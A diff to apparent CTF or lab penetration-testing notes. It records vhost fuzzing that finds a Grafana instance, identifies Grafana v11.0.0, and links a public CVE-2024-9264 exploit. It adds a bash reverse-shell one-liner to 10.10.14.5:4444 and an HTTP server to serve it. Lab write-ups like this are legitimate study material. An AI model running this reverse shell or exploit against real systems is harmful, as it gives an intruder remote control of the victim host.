@@ -113,7 +113,12 @@ grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 17
 :: Progress: [100000/100000] :: Job [1/1] :: 626 req/sec :: Duration: [0:02:17] :: Errors: 0 ::
 
 ```
-Added grafana to etc/hosts
+- Added grafana to etc/hosts
+- Provided creds work in Grafana portal
+- Page source is saying Grafana v11.0.0
+-  https://github.com/nollium/CVE-2024-9264
+-  Made a basic reverse shell file: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
+-  Started listening on port 8000 with: `python3 -m http.server 8000`
 # SSH
 ```
 ┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
